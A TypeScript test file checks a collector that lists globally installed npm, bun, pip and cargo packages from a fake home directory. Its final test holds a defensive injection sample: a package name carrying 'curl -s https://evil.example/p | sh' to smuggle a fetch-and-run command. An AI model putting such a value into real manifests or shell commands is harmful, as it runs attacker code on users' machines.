import { afterEach, describe, expect, test } from 'bun:test'
import { collectPackages } from '../src/collectors/packages'
import { type Fixture, makeHome } from './fixture'

let fixture: Fixture | null = null

afterEach(async () => {
  await fixture?.cleanup()
  fixture = null
})

function ids(items: { id: string }[]): string[] {
  return items.map((item) => item.id).sort()
}

describe('collectPackages', () => {
  test('npm globals beside a PATH bin folder, without the ones Node ships', async () => {
    fixture = await makeHome(
      {
        '.npm-global/lib/node_modules/acme-cli/package.json': '{}',
        '.npm-global/lib/node_modules/@acme/lint/package.json': '{}',
        '.npm-global/lib/node_modules/npm/package.json': '{}',
        '.npm-global/lib/node_modules/corepack/package.json': '{}',
        '.npm-global/lib/node_modules/.package-lock.json': '{}',
        '.other/lib/node_modules/not-on-path/package.json': '{}',
      },
      { path: ['~/.npm-global/bin', '~/.npm-global/bin', '/sys/bin'] },
    )
    const items = await collectPackages(fixture.ctx)
    expect(ids(items)).toEqual(['package:npm:@acme/lint', 'package:npm:acme-cli'])
    expect(items.find((item) => item.name === 'acme-cli')).toMatchObject({
      kind: 'package',
      category: 'manual',
      origin: 'npm:acme-cli',
      fingerprint: '',
    })
  })

  test('bun globals from its global package.json', async () => {
    fixture = await makeHome({
      '.bun/install/global/package.json': JSON.stringify({ dependencies: { 'fetch-logs': '^1.2.0', '@acme/kit': '2.0.0' } }),
    })
    const items = await collectPackages(fixture.ctx)
    expect(ids(items)).toEqual(['package:bun:@acme/kit', 'package:bun:fetch-logs'])
    expect(items.find((item) => item.name === 'fetch-logs')?.origin).toBe('bun:fetch-logs')
  })

  test('pip user installs, once across Python versions, with no version anywhere', async () => {
    fixture = await makeHome({
      '.local/lib/python3.11/site-packages/acme_tool-1.0.0.dist-info/RECORD': '',
      '.local/lib/python3.12/site-packages/acme_tool-1.1.0.dist-info/RECORD': '',
      '.local/lib/python3.12/site-packages/acme_tool/__init__.py': '',
    })
    const items = await collectPackages(fixture.ctx)
    expect(ids(items)).toEqual(['package:pip:acme_tool'])
    expect(items[0]?.origin).toBe('pip:acme_tool')
    expect(JSON.stringify(items)).not.toContain('1.0.0')
    expect(JSON.stringify(items)).not.toContain('python3')
  })

  test('pip user installs on macOS live in ~/Library/Python', async () => {
    fixture = await makeHome({
      'Library/Python/3.12/lib/python/site-packages/acme_tool-1.1.0.dist-info/RECORD': '',
    })
    const items = await collectPackages(fixture.ctx)
    expect(ids(items)).toEqual(['package:pip:acme_tool'])
  })

  test('cargo crates from .crates.toml', async () => {
    fixture = await makeHome({
      '.cargo/.crates.toml':
        '[v1]\n"fast-grep 1.2.0 (registry+https://example.invalid/index)" = ["fg"]\n"acme-fmt 0.3.1 (registry+https://example.invalid/index)" = ["acme-fmt", "acme-fmt-check"]\n',
    })
    const items = await collectPackages(fixture.ctx)
    expect(ids(items)).toEqual(['package:cargo:acme-fmt', 'package:cargo:fast-grep'])
    expect(items.find((item) => item.name === 'fast-grep')).toMatchObject({ origin: 'cargo:fast-grep' })
    expect(JSON.stringify(items)).not.toContain('1.2.0')
  })

  test('an empty home has no packages', async () => {
    fixture = await makeHome({})
    expect(await collectPackages(fixture.ctx)).toEqual([])
  })
})

test('a name no package manager would accept is not turned into a command', async () => {
  fixture = await makeHome({
    '.bun/install/global/package.json': JSON.stringify({
      dependencies: { 'acme-cli': '1.0.0', 'x; curl -s https://evil.example/p | sh; #': '1.0.0' },
    }),
  })
  const items = await collectPackages(fixture.ctx)
  expect(ids(items)).toEqual(['package:bun:acme-cli'])
  expect(JSON.stringify(items)).not.toContain('evil.example')
})
